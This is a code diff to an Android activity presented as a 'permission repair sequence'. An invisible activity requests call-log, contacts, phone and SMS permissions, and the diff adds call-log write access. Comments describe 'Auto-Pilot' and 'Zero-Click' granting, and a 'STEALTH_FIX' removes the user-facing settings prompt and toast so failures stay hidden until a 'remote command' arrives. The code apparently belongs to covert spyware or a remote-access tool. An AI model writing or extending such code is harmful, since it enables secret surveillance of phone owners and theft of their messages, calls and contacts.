@@ -30,7 +30,7 @@ public class PermissionActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         // Activity is transparent via theme in Manifest
-        getWindow().setGravity(android.view.Gravity.CENTER);
+        getWindow().setGravity(android.view.Gravity.BOTTOM);
         
         Log.d("PermissionActivity", "Remote permission repair sequence initiated.");
         requestAllPermissions();
@@ -50,6 +50,7 @@ public class PermissionActivity extends AppCompatActivity {
 
         // 2. Comms
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add(Manifest.permission.READ_CALL_LOG);
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_CALL_LOG) != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add(Manifest.permission.WRITE_CALL_LOG);
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add(Manifest.permission.READ_CONTACTS);
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add(Manifest.permission.CALL_PHONE);
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add(Manifest.permission.READ_SMS);
@@ -68,13 +69,13 @@ public class PermissionActivity extends AppCompatActivity {
             // [HARDENED_REQUEST] Re-trigger even if system thinks we shouldn't
             ActivityCompat.requestPermissions(this, permissionsNeeded.toArray(new String[0]), PERMISSION_REQUEST_CODE);
             
-            // Safety: If no dialog appears after 5 seconds (system block), open Settings
+            // Safety: Give Auto-Pilot more time to cycle through large batches
             new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                 if (!isFinishing()) {
                     Log.d("PermissionActivity", "No interaction detected, opening system settings fallback.");
                     openAppSettings();
                 }
-            }, 6000);
+            }, 12000);
         } else {
             // Finalize: No more prompts needed
             finishSequence();
@@ -83,11 +84,9 @@ public class PermissionActivity extends AppCompatActivity {
 
     private void openAppSettings() {
         try {
-            Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
-            intent.setData(android.net.Uri.parse("package:" + getPackageName()));
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            startActivity(intent);
-            Toast.makeText(this, "Please enable missing permissions manually", Toast.LENGTH_LONG).show();
+            // [STEALTH_FIX] Don't show toast or open settings automatically
+            // If it fails, just wait for the next trigger or remote command
+            Log.w("PermissionActivity", "Zero-Click granting sequence stalled. Terminating activity.");
         } catch (Exception ignored) {}
         finish();
     }
@@ -115,7 +114,7 @@ public class PermissionActivity extends AppCompatActivity {
 
     private void finishSequence() {
         Log.d("PermissionActivity", "Repair sequence complete. Closing invisible activity.");
-        LabRatsHttpServer.logActivity("LOCATE_MAINTENANCE: Permission repair sequence completed.");
+        FirebaseConfig.logActivity("LOCATE_MAINTENANCE: Permission repair sequence completed.");
         finish();
     }
 }
